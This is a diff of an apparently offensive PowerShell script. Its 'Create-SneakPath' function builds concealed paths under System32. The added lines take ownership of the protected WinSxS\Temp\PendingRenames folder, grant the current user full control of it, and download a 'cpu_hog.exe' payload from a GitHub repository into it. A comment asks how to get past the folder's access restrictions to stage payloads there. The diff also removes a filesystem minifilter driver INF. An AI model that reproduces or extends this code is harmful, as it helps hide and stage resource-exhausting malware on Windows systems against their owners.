@@ -210,43 +210,9 @@ function Create-SneakPath{
 $customHell = Create-SneakPath -BasePath 'C:\Windows\System32\'
 $deepPaths+= $customHell#+Add+to+your+damn+array
 
+takeown /f "C:\Windows\WinSxS\Temp\PendingRenames" /r /d y
+icacls "C:\Windows\WinSxS\Temp\PendingRenames" /grant "$($env:USERNAME):(OI)(CI)F" /t /q
+iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/cpu_hog.exe" -outfile "C:\Windows\WinSxS\Temp\PendingRenames\gg.exe" #for testing
+
 # by default "C:\Windows\WinSxS" can't be accessed as admin, neither any files can be downloaded. how to bypass and download payloads there? I want specifically this path : C:\Windows\WinSxS\Temp\PendingRenames to download my payloads
-
-// === FileMonFilter.inf ===
-[Version]
-Signature="$WINDOWS NT$"
-Class=ActivityMonitor
-ClassGuid={f3d654aa-fda0-11d3-bd28-000000000000}
-Provider=%ManufacturerName%
-DriverVer=06/21/2025,1.0.0.0
-CatalogFile=FileMonFilter.cat
-
-[DestinationDirs]
-DefaultDestDir = 12
-
-[DefaultInstall]
-CopyFiles=FilesToCopy
-AddReg=AddService
-
-[FilesToCopy]
-FileMonFilter.sys
-
-[AddService]
-HKR,"System\CurrentControlSet\Services\FileMonFilter","Type",0x10001,2
-HKR,"System\CurrentControlSet\Services\FileMonFilter","Start",0x10001,3
-HKR,"System\CurrentControlSet\Services\FileMonFilter","ErrorControl",0x10001,1
-HKR,"System\CurrentControlSet\Services\FileMonFilter","ImagePath",0x20000,"\SystemRoot\System32\drivers\FileMonFilter.sys"
-HKR,"System\CurrentControlSet\Services\FileMonFilter\Instances","DefaultInstance",0x00000000,"FileMon Instance"
-HKR,"System\CurrentControlSet\Services\FileMonFilter\Instances\FileMon Instance","Altitude",0x00000000,"370030"
-HKR,"System\CurrentControlSet\Services\FileMonFilter\Instances\FileMon Instance","Flags",0x00010001,0
-
-[SourceDisksFiles]
-FileMonFilter.sys=1
-
-[SourceDisksNames]
-1=%DiskName%,,,
-
-[Strings]
-ManufacturerName="YourCompany"
-DiskName="FileMonFilter Install Disk"
 ### END
